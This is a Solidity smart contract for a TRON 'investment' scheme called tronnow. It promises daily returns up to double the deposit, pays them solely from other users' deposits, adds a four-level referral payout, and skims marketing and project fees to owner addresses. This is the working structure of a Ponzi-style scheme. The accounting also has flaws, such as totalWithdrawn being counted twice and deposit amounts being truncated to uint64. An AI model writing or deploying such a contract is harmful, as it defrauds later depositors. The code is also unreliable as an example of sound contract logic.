//SourceUnit: tronnowv2.sol

pragma solidity 0.5.10;

contract tronnow {
    using SafeMath for uint;

    uint constant public DEPOSITS_MAX = 100;
    uint constant public INVEST_MIN_AMOUNT = 100 trx;
    uint constant public BASE_PERCENT = 100;
    uint[] public REFERRAL_PERCENTS = [500, 300, 100, 100];
    uint constant public MARKETING_FEE = 400;
    uint constant public PROJECT_FEE = 300;
    uint constant public MAX_CONTRACT_PERCENT = 800;
    uint constant public MAX_HOLD_PERCENT = 100;
    uint constant public PERCENTS_DIVIDER = 10000;
    uint constant public CONTRACT_BALANCE_STEP = 500000 trx;
    uint constant public TIME_STEP = 1 days;
    uint256 public constant AUTOCOMPOUND = 25;

    uint public totalDeposits;
    uint public totalInvested;
    uint public totalWithdrawn;

    uint public contractPercent;
    uint public contractCreation;

    address payable public marketingAddress;
    address payable public projectAddress;

    struct Deposit {
        uint256 amount;
        uint64 withdrawn;
        uint32 start;
    }

    struct User {
        Deposit[] deposits;
        uint32 checkpoint;
        address referrer;
        uint64 bonus;
		uint level1;
		uint level2;
		uint level3;
		uint level4;
        uint24[] refs;
    }

    mapping (address => User) internal users;
    mapping (uint => uint) internal turnover;

    event Newbie(address user);
    event NewDeposit(address indexed user, uint amount);
    event Withdrawn(address indexed user, uint amount);
    event RefBonus(address indexed referrer, address indexed referral, uint indexed level, uint amount);
    event FeePayed(address indexed user, uint totalAmount);

    constructor(address payable marketingAddr, address payable projectAddr) public {
        require(!isContract(marketingAddr) && !isContract(projectAddr));
        marketingAddress = marketingAddr;
        projectAddress = projectAddr;
        contractCreation = block.timestamp;
        contractPercent = getContractBalanceRate();
    }

    function invest(address referrer) public payable {
        require(!isContract(msg.sender) && msg.sender == tx.origin);

        require(msg.value >= INVEST_MIN_AMOUNT, "Minimum deposit amount 100 TRX");

        User storage user = users[msg.sender];

        require(user.deposits.length < DEPOSITS_MAX, "Maximum 100 deposits from address");

        uint msgValue = msg.value;

        uint marketingFee = msgValue.mul(MARKETING_FEE).div(PERCENTS_DIVIDER);
        uint projectFee = msgValue.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);

        marketingAddress.transfer(marketingFee);
        projectAddress.transfer(projectFee);

        emit FeePayed(msg.sender, marketingFee.add(projectFee));
		if (user.referrer == address(0)) {
			if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
				user.referrer = referrer;
			} 
			address upline = user.referrer;
			for (uint256 i = 0; i < 4; i++) {
				if (upline != address(0)) {
					if (i == 0) {
						users[upline].level1 = users[upline].level1.add(1);
					} else if (i == 1) {
						users[upline].level2 = users[upline].level2.add(1);
					} else if (i == 2) {
						users[upline].level3 = users[upline].level3.add(1);
					} else if (i == 3) {
						users[upline].level4 = users[upline].level4.add(1);
					}
					upline = users[upline].referrer;
				} else break;
			}
		}
		if (user.referrer != address(0)) {
			address upline = user.referrer;
			for (uint256 i = 0; i < 4; i++) {
				if (upline != address(0)) {
					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
                    address(uint160(upline)).transfer(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}
		
		}

        if (user.deposits.length == 0) {
            user.checkpoint = uint32(block.timestamp);
            emit Newbie(msg.sender);
        }

        user.deposits.push(Deposit(uint64(msgValue), 0, uint32(block.timestamp)));

        totalInvested = totalInvested.add(msgValue);
        totalDeposits++;

        if (contractPercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
            uint contractPercentNew = getContractBalanceRate();
            if (contractPercentNew > contractPercent) {
                contractPercent = contractPercentNew;
            }
        }

        emit NewDeposit(msg.sender, msgValue);
    }

    function withdraw() public {
        User storage user = users[msg.sender];

        uint userPercentRate = getUserPercentRate(msg.sender);

        uint totalAmount;
        uint dividends;

        for (uint i = 0; i < user.deposits.length; i++) {

            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(2)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(2)) {
                    dividends = (uint(user.deposits[i].amount).mul(2)).sub(uint(user.deposits[i].withdrawn));
                }

                user.deposits[i].withdrawn = uint64(uint(user.deposits[i].withdrawn).add(dividends)); /// changing of storage data
                totalAmount = totalAmount.add(dividends);

            }
        }

        require(totalAmount > 0, "User has no dividends");

        uint contractBalance = address(this).balance;
        if (contractBalance < totalAmount) {
            totalAmount = contractBalance;
        }
        
            uint256 _25Percent = totalAmount.mul(AUTOCOMPOUND).div(100);
            uint256 amountLess25 = totalAmount.sub(_25Percent);
        
            autoreinvest(_25Percent);
            totalAmount = 0;

            totalWithdrawn += amountLess25;


        user.checkpoint = uint32(block.timestamp);

        msg.sender.transfer(amountLess25);
        uint marketingFee = amountLess25.mul(MARKETING_FEE).div(PERCENTS_DIVIDER);
        uint projectFee = amountLess25.mul(PROJECT_FEE).div(PERCENTS_DIVIDER);

        marketingAddress.transfer(marketingFee);
        projectAddress.transfer(projectFee);


        totalWithdrawn = totalWithdrawn.add(amountLess25);

        emit Withdrawn(msg.sender, amountLess25);
    }
    
    function autoreinvest(uint256 _amount)private{
        User storage user = users[msg.sender];

        user.deposits.push(Deposit({
            amount: _amount,
            withdrawn: 0,
            start: uint32(block.timestamp)
        }));

        totalInvested += _amount;
    }

    function getContractBalance() public view returns (uint _contractbalance) {
        return address(this).balance;
    }

    function getContractBalanceRate() internal view returns (uint) {
        uint contractBalance = address(this).balance;
        uint contractBalancePercent = BASE_PERCENT.add(contractBalance.div(CONTRACT_BALANCE_STEP).mul(10));

        if (contractBalancePercent < BASE_PERCENT.add(MAX_CONTRACT_PERCENT)) {
            return contractBalancePercent;
        } else {
            return BASE_PERCENT.add(MAX_CONTRACT_PERCENT);
        }
    }

    function getUserPercentRate(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        if (isActive(userAddress)) {
            uint timeMultiplier = (block.timestamp.sub(uint(user.checkpoint))).div(TIME_STEP.div(2)).mul(5);
            if (timeMultiplier > MAX_HOLD_PERCENT) {
                timeMultiplier = MAX_HOLD_PERCENT;
            }
            return contractPercent.add(timeMultiplier);
        } else {
            return contractPercent;
        }
    }

    function getUserAvailable(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint userPercentRate = getUserPercentRate(userAddress);

        uint totalDividends;
        uint dividends;

        for (uint i = 0; i < user.deposits.length; i++) {

            if (uint(user.deposits[i].withdrawn) < uint(user.deposits[i].amount).mul(2)) {

                if (user.deposits[i].start > user.checkpoint) {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.deposits[i].start)))
                        .div(TIME_STEP);

                } else {

                    dividends = (uint(user.deposits[i].amount).mul(userPercentRate).div(PERCENTS_DIVIDER))
                        .mul(block.timestamp.sub(uint(user.checkpoint)))
                        .div(TIME_STEP);

                }

                if (uint(user.deposits[i].withdrawn).add(dividends) > uint(user.deposits[i].amount).mul(2)) {
                    dividends = (uint(user.deposits[i].amount).mul(2)).sub(uint(user.deposits[i].withdrawn));
                }

                totalDividends = totalDividends.add(dividends);

                /// no update of withdrawn because that is view function

            }

        }

        return totalDividends;
    }

    function isActive(address userAddress) public view returns (bool) {
        User storage user = users[userAddress];

        return (user.deposits.length > 0) && uint(user.deposits[user.deposits.length-1].withdrawn) < uint(user.deposits[user.deposits.length-1].amount).mul(2);
    }

    function getUserAmountOfDeposits(address userAddress) public view returns (uint) {
        return users[userAddress].deposits.length;
    }

    function getUserTotalDeposits(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint amount;

        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].amount));
        }

        return amount;
    }

    function getUserTotalWithdrawn(address userAddress) public view returns (uint) {
        User storage user = users[userAddress];

        uint amount = user.bonus;

        for (uint i = 0; i < user.deposits.length; i++) {
            amount = amount.add(uint(user.deposits[i].withdrawn));
        }

        return amount;
    }

    function getUserDeposits(address userAddress) view external returns (uint[] memory _amount, uint[] memory _withdrawn) {
        User storage user = users[userAddress];
        uint256[] memory _amounts = new uint256[](user.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](user.deposits.length);

        for(uint256 i = 0; i < user.deposits.length; i++) {
          Deposit storage dep = user.deposits[i];
          _amounts[i] = dep.amount;
          _totalWithdraws[i] = dep.withdrawn;
        }
        return (_amounts, _totalWithdraws);
    }

    function getSiteStats() view external returns (uint _invested, uint _deposited, uint _contract, uint _contract_perc, uint _withdrawn) {
        return (totalInvested, totalDeposits, address(this).balance, contractPercent, totalWithdrawn);
    }

    function getUserStats(address userAddress) view external returns (uint _userperc, uint _available, uint _deposits, uint _amountofdeposits, uint _totalwithdrawn) {
        uint userPerc = getUserPercentRate(userAddress);
        uint userAvailable = getUserAvailable(userAddress);
        uint userDepsTotal = getUserTotalDeposits(userAddress);
        uint userDeposits = getUserAmountOfDeposits(userAddress);
        uint userWithdrawn = getUserTotalWithdrawn(userAddress);

        return (userPerc, userAvailable, userDepsTotal, userDeposits, userWithdrawn);
    }

	function getUserDownlineCount(address userAddress) public view returns(uint lvl1, uint lvl2, uint lvl3, uint lvl4) {
		return (users[userAddress].level1, users[userAddress].level2, users[userAddress].level3, users[userAddress].level4);
	}

    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}